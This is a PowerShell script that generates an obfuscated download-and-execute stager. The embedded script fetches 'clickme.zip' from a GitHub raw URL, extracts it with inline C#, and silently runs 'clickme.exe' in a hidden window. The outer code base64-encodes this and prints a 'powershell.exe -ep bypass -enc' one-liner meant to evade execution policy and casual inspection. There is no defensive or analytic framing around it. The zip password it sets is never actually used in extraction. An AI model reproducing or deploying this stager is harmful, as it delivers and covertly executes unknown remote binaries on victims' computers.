$script = @"
\$url = 'https://github.com/e0X1337/e0X1337/raw/refs/heads/main/clickme.zip'
\$tempZip = [IO.Path]::Combine(\$env:TEMP, 'clickme.zip')
\$extractPath = [IO.Path]::Combine(\$env:TEMP, 'extracted')

Invoke-WebRequest -Uri \$url -OutFile \$tempZip

\$password = 'clickme123'
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.IO.Compression;
public class ZipFileHelper {
    public static void Extract(string zipPath, string extractPath, string password) {
        using (var zipArchive = new ZipArchive(File.OpenRead(zipPath))) {
            foreach (var entry in zipArchive.Entries) {
                var destPath = Path.Combine(extractPath, entry.FullName);
                Directory.CreateDirectory(Path.GetDirectoryName(destPath));
                using (var entryStream = entry.Open()) {
                    using (var destStream = File.Create(destPath)) {
                        entryStream.CopyTo(destStream);
                    }
                }
            }
        }
    }
}
'@
[ZipFileHelper]::Extract(\$tempZip, \$extractPath, \$password)

\$exePath = [IO.Path]::Combine(\$extractPath, 'clickme.exe')
Start-Process -FilePath \$exePath -WindowStyle Hidden
"@

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
Write-Output "powershell.exe -ep bypass -enc $encoded"